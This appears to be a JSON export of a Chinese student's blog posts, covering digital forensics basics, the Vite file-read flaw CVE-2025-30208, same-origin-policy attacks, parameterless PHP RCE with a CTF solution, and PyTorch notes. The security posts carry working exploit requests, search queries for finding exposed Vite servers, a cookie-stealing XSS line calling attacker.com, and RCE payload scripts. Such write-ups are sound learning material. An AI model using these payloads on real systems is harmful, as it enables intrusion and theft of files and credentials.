[{"title":"数据取证-1day","url":"/2025/04/14/%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-1day/","content":"初探取证电子数据取证专业名词术语临时文件计算机使用过程中产生的临时数据，这些临时文件有时也可以给我们的调查提供一些线索\n系统临时文件C:\\Windows\\Temp\\*.tmpIE访问临时文件C:\\Documents and Settings\\Username\\Local Settings\\Temporary Internet Filesoffice文档编辑时产生的临时文件C:\\Documnets and Settings\\Administrator\\Application Data\\Microsoft\\Word\n\n历史记录是指多数计算机程序在运行的过程中产生的 记录信息\n在浏览器中，历史记录是指浏览器曾经访问过的网站在计算机中存在的信息iis访问日志记录服务器的一些状况和访问ip的来源和登录情况等\n\n未分配簇是指哪些在当前文件系统中没有被分配的空间，数据恢复就是从将那些在磁盘上已删除的文件但空间地址未被覆盖，\n在这里讲一下数据恢复的概念\n比如你有一个文件，但是现在你把他删除了，你表面上是看不到这个文件了，但其实是这个文件隐藏起来了，文件资源管理器会对电脑发出指令，这个文件的内存地址我不需要了，你爱咋咋地，也就是后面新来的数据会直接覆盖在上面，如果被删除的文件的内存地址尚未被覆盖，那么就可以使用恢复工具进行恢复\n\n未分配簇中可能包含大量重要的证据信息，只要数据未被覆盖，可以通过相关技术检索到或直接恢复，这是非常重要的\n可以在取证软件中查看未分配簇内容，包含曾经被删除的数据\n文件残留区文件残留区是指文件逻辑大小到物理大小末尾之间的数据\n|---------------------------------------|----------------||&lt;--------------逻辑大小----------------&gt;|&lt;----文件残留区-&gt;||&lt;--------------------------物理大小---------------------&gt;|\n\n簇：文件储存的最小单位，簇是有多个扇区组成\n隐藏文件的方式\n硬盘加密，压缩包加密，bitlocker加密，office文件加密，虚拟容器加密，修改文件拓展名，EFS文件加密，信息隐写","categories":["取证"],"tags":["取证"]},{"title":"CVE-2025-30208","url":"/2025/04/14/CVE-2025-30208/","content":"CVE-2025-30208也是今天打题的时候，遇到的一个特别有意思的服务器漏洞，在这里记录一下，利用难度也不是很大\n漏洞简介CVE-2025-30208 是 Vite 开发服务器中的一个任意文件读取漏洞。该漏洞允许攻击者通过特定的 URL 参数绕过访问控制，从而读取服务器上的敏感文件（如 &#x2F;etc&#x2F;passwd 或 C:\\windows\\win.ini）。\n该漏洞主要影响以下版本的 Vite：\n6.2.3 之前6.1.2 之前6.0.12 之前5.4.15 之前4.5.10 之前\n漏洞原理Vite 开发服务器提供 @fs 机制，用于防止访问 Vite 允许列表之外的文件。然而，由于 URL 解析时的正则表达式处理不当，攻击者可以通过 ?raw?? 或 ?import&amp;raw?? 等查询参数绕过访问限制，从而读取任意文件。\n详细分析在 Vite 服务器的 URL 处理逻辑中，@fs 机制原本用于限制对非白名单目录的访问，例如：\nserver: &#123;  fs: &#123;    allow: [path.resolve(__dirname, &#x27;src&#x27;)]  &#125;&#125;\n\n然而，Vite 在 URL 解析过程中会移除部分特殊字符，而未正确考虑查询参数的影响，导致攻击者可以构造类似如下的请求绕过安全检查：\nGET /@fs/etc/passwd?raw??GET /@fs/etc/passwd?import&amp;raw??\n\n由于 Vite 解析 URL 时未正确处理这些参数，导致绕过 server.fs.allow 限制，并返回任意文件内容。\n漏洞利用Fofa &amp; Hunter 搜索攻击者可使用以下测绘语句搜索可能受影响的 Vite 服务器：\nFofa:body=&quot;/@vite/client&quot;Hunter:web.body=&quot;/@vite/client&quot;PoC（概念验证）启动 Vite 服务器：$ npm create vite@latest$ cd vite-project/$ npm install$ npm run dev创建测试文件：$ echo &quot;top secret content&quot; &gt; /tmp/secret.txt发送漏洞利用请求：### \n\n正常情况下被拒绝$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt&quot;\n\n绕过访问控制$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??&quot;export default &quot;top secret content\\n&quot;漏洞验证GET /etc/passwd?import&amp;raw?? HTTP/1.1Host: ********","categories":["web"],"tags":["web"]},{"title":"同源策略攻防","url":"/2025/04/14/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E6%94%BB%E9%98%B2/","content":"同源策略及其攻防详解1. 同源策略的定义与作用同源策略是由Netscape提出的一种安全策略，用于限制不同源（协议、域名、端口）的文档或脚本如何与另一个源的资源进行交互。只有当协议、域名和端口完全相同时，才被认为是同源。\n作用：\n\n保护用户数据安全，防止不同源的脚本访问或修改当前页面的敏感数据。\n防止敏感数据泄露，限制跨域请求。\n防止跨站脚本攻击（XSS）和跨站请求伪造（CSRF）等安全威胁。\n\n2. 与同源策略相关的攻击（1）跨站脚本攻击（XSS）原理：攻击者通过注入恶意JavaScript代码，使其在用户浏览器中执行，窃取用户敏感信息或篡改页面内容。\n案例：在一个论坛的留言板功能中，如果未对用户输入进行严格过滤，攻击者可以在留言框中输入以下代码：\n&lt;script&gt;document.location=&#x27;http://attacker.com?cookie=&#x27;+document.cookie&lt;/script&gt;\n\n当其他用户访问该留言页面时，这段恶意脚本会被执行，将用户的cookie信息发送到攻击者的服务器。\n与同源策略的关系：XSS攻击利用网站漏洞，使得恶意脚本在同源页面中执行，绕过同源策略的限制。\n（2）跨站请求伪造（CSRF）原理：攻击者利用用户已登录的状态，伪造请求，执行未经授权的操作。\n案例：假设银行网站的转账操作URL为：\nhttp://bank.com/transfer?to=123456&amp;amount=1000\n\n攻击者可以在一个恶意页面中创建一个隐藏的链接或按钮，链接指向上述URL。当用户在已登录银行网站的状态下访问该恶意页面并点击链接时，资金可能被转走。\n与同源策略的关系：CSRF攻击通过诱导用户点击恶意链接，绕过同源策略对跨域请求的部分限制。\n（3）点击劫持（Clickjacking）原理：攻击者通过透明iframe等手段，诱导用户点击，执行恶意操作。\n案例：在一个看似普通的图片页面中，攻击者可能隐藏一个透明的iframe，用户点击图片时，实际触发了iframe中的恶意链接。\n与同源策略的关系：点击劫持利用用户的视觉错觉，绕过同源策略对页面交互操作的限制。\n3. 基于同源策略的防御措施（1）针对XSS攻击\nHttpOnly属性：禁止JavaScript访问带有HttpOnly属性的cookie，防止cookie被XSS攻击窃取。例如，在服务器端设置cookie时使用以下代码（以PHP为例）：\nsetcookie(&#x27;user_id&#x27;, $user_id, time() + 3600, &#x27;/&#x27;, &#x27;&#x27;, false, true);\n\n其中最后一个参数true表示设置了HttpOnly属性。\n\n输入输出检查：对用户输入进行严格过滤，对输出进行编码。例如，过滤掉特殊符号如&lt;、&gt;等，并在输出时将其编码为&lt;、&gt;。\n\n\n（2）针对CSRF攻击\n验证码：增加用户操作的验证步骤，防止攻击者伪造请求。\nReferer检查：验证请求来源是否为同源，拒绝非同源请求。\nToken机制：在请求中加入随机Token，确保请求的合法性。\n\n（3）针对点击劫持\nX-Frame-Options：通过HTTP头限制页面被嵌入iframe，防止点击劫持。\n禁止跨域iframe：通过JavaScript代码防止页面被嵌套在恶意iframe中。\n\n4. 总结同源策略是Web安全的重要基石，通过限制不同源之间的交互，有效保护用户数据和隐私。然而，攻击者可能利用漏洞绕过同源策略，因此开发者需要采取多种防御措施，如输入验证、输出编码、使用安全的Cookie属性等，以增强Web应用的安全性。\n","categories":["web"],"tags":["web"]},{"title":"无参数rce","url":"/2025/04/14/%E6%97%A0%E5%8F%82%E6%95%B0rce/","content":"无参数rce这是今天打tgctf2025题的时候，遇到的问题，秉持着遇到问题就解决的思想，写下这篇博客，系统的研究无参数rce，废话不多说\n什么是无参数就是使用函数的时候不能带有参数，具体来说就是各种函数的嵌套，利用各种函数的返回值\n常见函数目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件\n\ngetallheaders()这个函数的作用是获取http所有的头部信息，也就是headers，然后我们可以用var_dump把它打印出来，但这个有个限制条件就是必须在apache的环境下可以使用，其它环境都是用不了的\nplaintext?code=print_r(getallheaders()); \n\n数组会返回 HTTP 请求头。\nget_defined_vars()getallheaders()`是有局限性的，因为如果中间件不是`apache`的话，它就用不了了，那我们就介绍一种更为普遍的方法`get_defined_vars()`，这种方法其实和上面那种方法原理是差不多的，它并不是获取的`headers`，而是获取的四个全局变量`$_GET $_POST $_FILES $_COOKIEplaintext?code=var_dump(get_defined_vars()); \n\nvar_dump可以把返回数组打印出来。\ngetenv()获取环境变量的值(在PHP7.1之后可以不给予参数)适用于：php7以上的版本\nplaintext?code=var_dump(getenv());\n\nphp7.0以下返回bool(false)\nphp7.0以上正常回显。\nplaintext?code=var_dump(getenv(phpinfo()));\n\nphpinfo()可以获取所有环境变量。\nscandir()文件读取\n查看当前目录文件名plaintextprint_r(scandir(current(localeconv())));\n\n读取当前目录文件plaintext当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));\n\n查看上一级目录文件名plaintextprint_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));\n\n读取上级目录文件plaintextshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));\n\npayload解释：● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名● dirname(chdir(dirname()))配合切换文件路径\n无参数读取文件查看当前目录\nprint_r(getcwd());\n\nprint_r(scandir(&#39;.&#39;))查看当前目录下所有文件，以数组的形式输出。\n但是要怎么构造.呢\n使用localeconv()\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是 .\n\ncurrent() 返回数组中的单元，默认第一个值。\n所以我们输出 print_r(scandir(current(localeconv())));也会如同 print_r(scandir(&#39;.&#39;))打印当前目录下文件名。\n\n使用 print_r(scandir(pos(localeconv())));，pos是current的别名\n\nreset()函数将内部指针指向数组中的第一个元素，并输出。\n\n相关的方法：\n\ncurrent()- 返回数组中的当前元素的值\nend()- 将内部指针指向数组中的最后一个元素，并输出\nnext()- 将内部指针指向数组中的下一个元素，并输出\nprev()- 将内部指针指向数组中的上一个元素，并输出\neach()- 返回当前元素的键名和键值，并将内部指针向前移动\n\n\n\n\n查看和读取根目录文件所获得的字符串第一位有几率是&#x2F;，需要多试几次\nphpprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));\n\ncurrent()和pos()pos()函数是current()函数的别名，两者是完全一样的，\n它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值。\nchdir()这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用chdir切就好了，如果要向上跳就要构造chdir(&#39;..&#39;)\narray_reverse()将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()\nhighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的\n查看上级目录方法一：dirname()\n从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径\n?code=print_r(scandir(dirname(getcwd())));\n\n方法二：构造”..”\nprint_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件next(scandir(chr(ord(hebrevc(crypt(time()))))))\n\nchdir() ：改变当前工作目录\n直接print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\n\n读取目录的函数\nshow_source()highlight_file()file_get_contents ()readfile()readgzfile()\n\n无参数命令执行(RCE)\n用其他变量辅佐eval传入参数\n$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\ngetallheaders()\ngetallheaders()获取全部 HTTP 请求头信息\napache_response_headers() 获得全部 HTTP 响应头信息\n这就意味着我们在headers里传入参数，再用该函数进行接收即可，但是其局限性在于只能是apeach 环境下。\nget_defined_vars()\n它能获取到以下变量\n$_GET$_POST$_FILES$_COOKIE\n\n如何利用file变量进行rce呢？\nimport requestsfiles = &#123;  &quot;system(&#x27;whoami&#x27;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))\n\nsession_id()\nsession_id()： 可以用来获取&#x2F;设置 当前会话 ID。\nsession需要使用session_start()开启，然后返回参数给session_id()\n但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）\n但是hex2bin()函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可\n（PHP5.5 -7.1.9可行）\n?code=show_source(session_id(session_start()));\n\n其他版本可考虑用hex2bin() 将十六进制形式的命令还原。\nimport requestsurl = &#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;payload = &quot;phpinfo();&quot;.encode(&#x27;hex&#x27;)cookies = &#123;    &#x27;PHPSESSID&#x27;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content\n\ngetenv()\ngetenv() 获取一个环境变量的值（只适用于7.1以后版本）\n通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。\n那么如何读取其他文件\n\narray_flip() 函数用于反转&#x2F;交换数组中的键名和对应关联的键值。\narray_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\n\n我们可以使用array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()是随机返回一个数组。\nreadfile(array_rand(array_flip(scandir(getcwd()))));readfile(array_rand(array_flip(scandir(current(localeconve())))));\n\n如果目标文件不在当前目录呢？\n\ndirname() ：返回路径中的目录部分，\n从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径\n\nchdir() ：改变当前工作目录\nprint_r(scandir(dirname(getcwd()))); //查看上一级目录的文件\n\n构造”..”\nprint_r(next(scandir(getcwd())));：我们scandir(getcwd())出现的数组第二个就是”..”，所以可以用next()获取\nprint_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件\n\n结合上文的一些构造都是可以获得”..”的 ：\nnext(scandir(chr(ord(hebrevc(crypt(time()))))))\n\n读取上级目录文件\n直接 print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录,前面写到了chdir()，使用：\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\n\n如果不能使用dirname()，可以使用构造”..”的方式切换路径并读取：\n但是这里切换路径后getcwd()和localeconv()不能接收参数，因为语法不允许，我们可以用之前的hebrevc(crypt(arg))\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));或更复杂的：show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));还可以用：show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位\n\n还有：\nif(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));\n\n三、实战例题-[GXYCTF2019]禁止套娃这道题目打开就是一个普通的页面，经过目录扫描会发现是git源码泄露，用Githack把源码弄出来：\nphp&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123;    if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;                // echo $_GET[&#x27;exp&#x27;];                @eval($_GET[&#x27;exp&#x27;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;\n\n代码分析首先看第一行关键代码：\nplaintext!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])\n\n很明显，大概意思就是不让我们用伪协议去写或者是读文件。\n然后看第二行关键代码：\nplaintext&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])\n\n再看第二个正则,中间有一个(?R)，这个式子他会递归调用当前的正则表达式，就是说会出现\\w+((?R)?)，\\w+(\\w+((?R)?))的情况，也就是无参数函数校验。\n最后第三行关键代码：\nplaintext!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])\n\n就是屏蔽了一些函数名的关键字之类的东西。\n分析完成我们整理一下：不能用伪协议 、只能用无参数函数形式、注意函数过滤\n解题步骤首先遍历当前目录：plaintext?exp=print_r(scandir(current(localeconv())));\n\n顺利得到目录。\n方法一：可以看到flag.php是倒数第二个，那我们把它反转一下，然后再用一个next()就是flag.php这个文件了：\nplaintext?exp=print_r(next(array_reverse(scandir(current(localeconv())))));\n\n已经很接近答案了，用highlight_file读取这个文件就拿到flag了：\nplaintext?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n\n思路总结\nplaintextscandir(current(localeconv()))是查看当前目录加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.phphighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码\n\n方法二：我们已经知道了flag就在当前目录下了。array_rand()函数可以随机读取一个数组键，array_flip()又可以将数组中的键和值进行对换。用这两个函数就可以实现对flag.php的读取。最后payload如下：\nplaintext?exp=print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));\n\n因为array_rand()的选取是随机的，所以不一定会直接出来，多刷新几次就可以了\n","categories":["web"],"tags":["web"]},{"title":"深度学习-1day","url":"/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-1day/","content":"深度学习和pytorch库简介今天所学到的:\n·了解到深度学习改变在机器学习中使用到的方法\n·pytorch为何适用于深度学习\n今天初识人工智能，这个定义其实是非常模糊的，机器实际上是无法做到真正的独立思考，在现如今发达的时代，模型执行以前这些只有人类才能完成的任务的能力是通过样本得来的，而不是人类通过编码将其变为规则\n深度学习的革命在过去的10年中，被称之为机器学习的一类系统重度依赖于特征工程，特征工程包括提出正确的转换，以便下游算法能够完成任务。例如，为了在手写数字的图像中区分1和0，我们会利用一组过滤器来判断图像上的边缘方向，然后训练一个分类器，在给定边缘方向分布的情况下预测正确的数字。另一个有用的特征可能是封闭圆圈的数量，比如对于数字0和8，特别是对于有2个圈的数字8。\n但是在深度学习中，完成的功能是在原始的数据中找到这样的表征，终点不在于手工制作这些特征，重点在于操作数学实体，去发现特征\n我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。\n为何使用pytorchpytorch使用gpu进行加速计算，速度更快，并且它还提供了支持数学表达式数值优化的工具，用于训练深度学习模型，也可以称之为为科学计算提供优化支持的高性能库，我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。\n其中张量是pytorch中比较重要的一个概念\n用于构建神经网络的PyTorch核心模块位于torch.nn中，它提供了通用的神经网络层和其他架构组件。全连接层、卷积层、激活函数和损失函数都可以在这里找到，这些组件可用于构建和初始化未训练的模型。为了训练模型，我们需要一些额外的东西：模型训练的数据源、一个使模型适应训练数据的优化器，以及一种把模型和数据传输到硬件的方法，该硬件用于执行模型训练所需的计算。\n菜🐕的笔记\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-2day","url":"/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2day/","content":"预训练神经网络网络上有很多是已经经过数据集训练的微型ai，非常的有趣，我们可以把预先训练的神经网络看作是一个接受输入并生成输出的程序，该程序的行为是有神经网络的结构以及它在训练过程中所看到的例子决定的，即期望的输入-输出对，或者期望输出满足的特性，使用现成的模型是快速启动深度学习的一种方法，节省了很多的时间\n一个识别图像主体的预训练网络作为对深度学习的第一次尝试，一个非常先进的深度神经网络是非常有必要的，有许多预先训练过的网络都可以通过源代码库进行访问呢，我本次尝试的是一个在imagenet数据集上的子集训练过的，\n具体来说，图像识别的任务包括获取一个输入图像，并从1000个类别中生成5个白哦前的列表，按可信度排序描述图像的内容\n获取一个预先训练好的网络我所使用的网络是从torchvision中获取的，该项目包含一些表现优异的，关于计算机视觉的神经网络架构，可以方便得访问数据集和其他工具，首先加载并运行两个网络，一个是AlexNet，它是在图像是被方面早期具有突破性得网络之一，然后是残差网络，简称ResNet\nIn[1]from torchvision import models我们可以看看有多少模型print(dir(models))# Out[2]: [&#x27;AlexNet&#x27;,  &#x27;DenseNet&#x27;,  &#x27;Inception3&#x27;,  &#x27;ResNet&#x27;,  &#x27;SqueezeNet&#x27;,  &#x27;VGG&#x27;, ...  &#x27;alexnet&#x27;,  &#x27;densenet&#x27;,  &#x27;densenet121&#x27;, ...  &#x27;resnet&#x27;,  &#x27;resnet101&#x27;,  &#x27;resnet152&#x27;, ...  ] \n\nAlexNet\n按照现在得标准，这是一个相当小得网络，但它非常适合着眼于神经网络，在AlexNet架构中，输入图像从左侧进入并且依次进入5个过滤器，每一个过滤器生成一些输出图像，经过每个过滤器后，图像会被缩小，在过滤器堆栈中，最后一个过滤器产生得图像被排列成一个拥有4096个元素得一维向量，并被分类以产生1000个输出，每个输出对应一个类\n我们可以创建一个AlexNet类得实例，\nalexnet = models.AlexNet()\n\n此时，alexnet是一个可运行得对象，可以像函数一样调用它\nResNet\n现在创建一个网络实例，传递一个参数，指示函数下载resnet101在imagenet数据集上训练好得权重\nresnet = models.resnet101(pretrained=True) \n\n准备运行resnet\n\n再输入图像之前，我们必须要对输入得图像进行预处理，使其大小正确，torchvision模块提供了转换得操作，允许我们快速定义基本预处理函数得管道\nfrom torchvision import transforms preprocess = transforms.Compose([         transforms.Resize(256),         transforms.CenterCrop(224),         transforms.ToTensor(),         transforms.Normalize(             mean=[0.485, 0.456, 0.406],             std=[0.229, 0.224, 0.225]         )]) \n\n这个函数我解释一下，将输入得图像缩放到256x256个像素，围绕中心将图像裁剪为224x224个像素，并将其转化为一个张量，对其rgb分量进行归一化处理，使其具有定义得均值和标准差，张量是一种pytorch多维数组，然后我们就可以加载图像了\nfrom PIL import Image img = Image.open(&quot;C:\\\\Users\\\\admin\\\\Pictures\\\\Camera Roll\\\\9C4F0A6EAC509071628AC3EF8D36CD8F.jpg&quot;) \n\n通过管道传递图像\nimg_t = preprocess(img) \n\n然后我们可以按照网络期望得方式对输入得张量进行重塑\nimport torch batch_t = torch.unsqueeze(img_t, 0) \n\n现在可以运行模型了\n运行模型为了进行推理，需要将网络置于eval模式\nresnet.eval()\n\n准备进行推理\nout = resnet(batch_t) out \n\n最终产生一个有1000个分数得向量，要查看预测标签得列表，我们需要架子啊一个文本文件，挑选出标签，\n# 如果您想自动下载标签文件import requestsimport os# 检查是否已经有标签文件labels_path = &quot;e:\\\\code\\\\.idea\\\\pytorch\\\\imagenet_classes.txt&quot;if not os.path.exists(labels_path):    # 从GitHub下载标签文件    url = &quot;https://raw.githubusercontent.com/pytorch/hub/master/imagenet_classes.txt&quot;    response = requests.get(url)    if response.status_code == 200:        with open(labels_path, &#x27;wb&#x27;) as f:            f.write(response.content)        print(f&quot;标签文件已下载到 &#123;labels_path&#125;&quot;)        # 读取下载的标签文件        with open(labels_path) as f:            labels = [line.strip() for line in f.readlines()]    else:        print(&quot;无法下载标签文件，使用内置的部分标签&quot;)else:    # 读取已有的标签文件    with open(labels_path) as f:        labels = [line.strip() for line in f.readlines()]\n\n最后就直接输出结果\n# 获取预测结果_, indices = torch.sort(out, descending=True)percentage = torch.nn.functional.softmax(out, dim=1)[0] * 100print(&quot;预测的前5个类别:&quot;)for idx in indices[0][:5]:    print(f&quot;&#123;labels[idx]&#125;: &#123;percentage[idx].item():.2f&#125;%&quot;)_, indices = torch.sort(out, descending=True)[(labels[idx],percentage[idx].item()) for idx in indices[0][:5]]\n\n输出结果如下\nwig: 14.47%stethoscope: 13.13%kimono: 10.52%hair slide: 10.51%academic gown: 5.38%\n\n识别结果如上，还是比较精准得吧\n菜🐕初探神经网络\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-3.day","url":"/2025/04/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-3-day/","content":"从张量基础知识开始学到的\n·张量，是pytorch中的最基本的数据结构\n·张量的索引与运算\n·与NumPy多维数组交互操作\n·将计算移动到GPU以提高速度\n深度学习实际上需要构建一个能将数据从一种转化为另一种表示的系统，系统可以正确的将具有给定形状和颜色的图像映射到标签上\n实际数据转化为浮点数浮点数是网络处理信息的方式，深度学习的神经网络通常在不同阶段学习将数据从一种形式转化为另一种形式，每一个阶段转换的数据可以被认为是一个中间表征序列，这些中间表征都是浮点数的集合\n输入表征（像素值）-------&gt;中间表征（浮点数集合)-------&gt;输出表征(类的概率)\n\n开始将数据转化为浮点数输入之前，必须要对pytorch如何处理和存储数据有深入的理解\n为此，pytorch引入了张量这个而基本的数据结构，在深度学习中张量可以将向量和矩阵推广到任意维度\n张量：多维数组从列表到张量列表的索引的作用是众所周知的，可以用对应的索引来访问相对应位置的数据，这可以用来类比张量中的索引\n构造第一个张量来构造第一个pytorch张量\nimport torcha = torch.ones(3)# 解释：torch.ones(3)创建了一个长度为3的一维张量，其中所有元素都被初始化为1# 所以当我们打印这个张量时，会看到3个1print(f&quot;这是一个一维张量，包含 &#123;len(a)&#125; 个元素: &#123;a&#125;&quot;)print(a[1])#访问到第二个位置的数据\n\n虽然看起来和列表差不多，但实际上是完全不一样的\n张量的本质张量通常是连续的内存块的视图，这些内存块包含未装箱的数字类型\n假设有一个坐标列表，用它来表示一个几何对象，如一个二维三角形，顶点有三个，我们可以使用一维张量，将x轴坐标储存在偶数索引中，将y轴坐标储存在奇数索引中，而不是在列表中使用数字来 表示坐标，如下所示：\npoints = torch.zeros(6) points[0] = 4.0 points[1] = 1.0 points[2] = 5.0 points[3] = 3.0 points[4] = 2.0 points[5] = 1.0 \n\n也可以像构造函数传递一个列表达到相同的效果，如下图所示：\npoints = torch.tensor([4.0, 1.0, 5.0, 3.0, 2.0, 1.0]) points \n\n尽管将第一个索引单独指向二维点而不是点是可行的，我们可以使用一个二维张量\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) points \n\n可以通过shape属性来查看张量的形状\npoints.shape输出torch.Size([3, 2])\n\n我们就可以知道每一个维度上张量的带线啊哦，我们还可以使用zeros方法和ones方法来初始化张量，以元组的形式来指定大小\npoints = torch.zeros(3, 2) points输出tensor([[0., 0.],\t\t[0., 0.],         \t\t[0., 0.]])\n\n我们可以使用两个索引来访问呢张量中单个元素\npoints[0, 